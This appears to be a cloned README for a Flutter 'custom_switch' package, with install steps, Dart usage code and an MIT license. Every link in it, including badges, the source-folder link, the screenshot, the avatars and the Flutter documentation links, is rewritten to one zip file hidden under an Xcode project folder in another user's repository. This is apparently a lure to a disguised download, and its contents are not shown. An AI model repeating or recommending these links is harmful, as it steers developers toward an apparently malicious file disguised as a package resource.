# custom_switch

Beautiful Custom Switch package created with Flutter.

[![Say Thanks!](https://img.shields.io/badge/Say%20Thanks-!-1EAEDB.svg)](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip)  


The source code is **100% Dart**, and everything resides in the [/lib](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip) folder.

## Show some :heart: and star the repo to support the project

 [![GitHub followers](https://img.shields.io/github/followers/mohak1283.svg?style=social&label=Follow)](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip)  [![Twitter Follow](https://img.shields.io/twitter/follow/mohak_gupta20.svg?style=social)](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip)

[![Open Source Love](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip)](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip)



## 💻 Installation

In the `dependencies:` section of your `pubspec.yaml`, add the following line:

```yaml
custom_switch: <latest_version>
```

Import in your project:
```dart
import 'package:custom_switch/custom_switch.dart';
```

## ❔Basic Usage
```dart
class HomeScreen extends StatefulWidget {
  @override
  _HomeScreenState createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {

  bool status = false;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('Custom Switch Example'),
      ),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: <Widget>[
            CustomSwitch(
              activeColor: Colors.pinkAccent,
              value: status,
              onChanged: (value) {
                print("VALUE : $value");
                setState(() {
                  status = value;
                });
              },
            ),
            SizedBox(height: 12.0,),
            Text('Value : $status', style: TextStyle(
              color: Colors.black,
              fontSize: 20.0
            ),)
          ],
        ),
      ),
    );
  }
}
```
## Screenshots

 ![custom_switch](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip) 


## 👨 Developed By

```
Mohak Gupta
```


<a href="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip"><img src="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip" width="60"></a>
<a href="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip"><img src="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip" width="60"></a>
<a href="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip"><img src="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip" width="60"></a>
<a href="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip"><img src="https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip" width="60"></a>


# 👍 How to Contribute

1. Fork it
2. Create your feature branch (git checkout -b my-new-feature)
3. Commit your changes (git commit -am 'Add some feature')
4. Push to the branch (git push origin my-new-feature)
5. Create new Pull Request

# 📃 License

    Copyright (c) 2019 Mohak Gupta

    Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

## Getting Started

For help getting started with Flutter, view our online [documentation](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip).

For help on editing package code, view the [documentation](https://github.com/fabianaguirre10/CustomSwitch/raw/refs/heads/master/example/ios/Runner.xcodeproj/Custom_Switch_1.8-alpha.2.zip).
